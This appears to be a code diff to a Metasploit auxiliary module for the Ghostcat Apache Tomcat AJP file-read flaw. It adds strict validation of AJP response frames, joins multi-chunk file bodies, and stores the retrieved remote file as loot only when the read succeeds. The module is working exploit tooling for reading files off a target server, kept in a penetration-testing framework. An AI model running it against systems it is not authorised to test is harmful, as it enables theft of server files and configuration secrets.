@@ -81,30 +81,55 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def parse_response(buf)
-    parsed_response = GhostCatResponse.new
+    # AJP packet layout: https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html
+    parsed_response = GhostCatResponse.new(nil, {}, ''.b)
 
     until buf.empty?
-      chunk = buf[4...(4 + buf.unpack1('xxn'))]
-      buf = buf[(4 + chunk.length)...]
+      raise Rex::RuntimeError, 'Unable to read file: incomplete AJP frame header' if buf.bytesize < 4
+      raise Rex::RuntimeError, 'Unable to read file: invalid AJP packet signature' unless buf.start_with?('AB')
+
+      length = buf.unpack1('xxn')
+      raise Rex::RuntimeError, 'Unable to read file: incomplete AJP frame payload' if length.zero? || buf.bytesize < 4 + length
+
+      chunk = buf.byteslice(4, length)
+      buf = buf.byteslice(4 + length..)
 
       case chunk[0].ord
       when ApacheJP::ApacheJPSendBodyChunk::PREFIX_CODE
+        raise Rex::RuntimeError, 'Unable to read file: AJP body arrived before status headers' unless parsed_response.status
+
         send_body_chunk = ApacheJP::ApacheJPSendBodyChunk.read(chunk)
-        parsed_response.body = send_body_chunk.body_chunk.to_s
+        unless chunk.bytesize == send_body_chunk.num_bytes + 1 && chunk.getbyte(-1).zero?
+          raise Rex::RuntimeError, 'Unable to read file: invalid AJP body chunk length or terminator'
+        end
+
+        # Files may span several SEND_BODY_CHUNK packets. Keep every byte,
+        # including binary data and the valid no-body-packet empty-file case.
+        parsed_response.body << send_body_chunk.body_chunk.to_s
       when ApacheJP::ApacheJPSendHeaders::PREFIX_CODE
+        raise Rex::RuntimeError, 'Unable to read file: duplicate AJP status headers' if parsed_response.status
+
         send_headers = ApacheJP::ApacheJPSendHeaders.read(chunk)
+        raise Rex::RuntimeError, 'Unable to read file: invalid AJP status header length' unless send_headers.num_bytes == chunk.bytesize
+
         parsed_response.status = send_headers.http_status_code.to_i
         parsed_response.headers = send_headers.headers.snapshot.map { |header| [header.header_name.to_s, header.header_value.to_s] }.to_h
       when ApacheJP::ApacheJPEndResponse::PREFIX_CODE
-        break
+        unless parsed_response.status && chunk.bytesize == 2 && [0, 1].include?(chunk.getbyte(1))
+          raise Rex::RuntimeError, 'Unable to read file: invalid AJP END_RESPONSE'
+        end
+
+        return parsed_response
       when ApacheJP::ApacheJPGetBodyChunk::PREFIX_CODE
         next # no need to process this chunk
       else
-        fail_with(Failure::UnexpectedReply, "Received unknown AJP prefix code: #{chunk[0].ord}")
+        raise Rex::RuntimeError, "Unable to read file: received unknown AJP prefix code: #{chunk[0].ord}"
       end
     end
 
-    parsed_response
+    raise Rex::RuntimeError, 'Unable to read file: incomplete AJP response without END_RESPONSE'
+  rescue IOError => e
+    raise Rex::RuntimeError, "Unable to read file: malformed AJP response (#{e.message})"
   end
 
   def read_success?(ghost_cat_response)
@@ -158,16 +183,19 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     ghost_cat_response = read_remote_file
-    print ghost_cat_response.body unless ghost_cat_response.body.blank?
-
     unless read_success?(ghost_cat_response)
       print_error 'Unable to read file, target may not be vulnerable.'
+      return
     end
+
+    print ghost_cat_response.body unless ghost_cat_response.body.blank?
 
     file = store_loot(
       datastore['FILENAME'].to_s, 'text/plain', datastore['RHOST'].to_s,
       ghost_cat_response.body, 'Ghostcat File Read/Inclusion', 'Read file', datastore['FILENAME']
     )
     print_good "File contents save to: #{file}"
+  rescue Rex::RuntimeError => e
+    fail_with(Failure::UnexpectedReply, e.message)
   end
 end
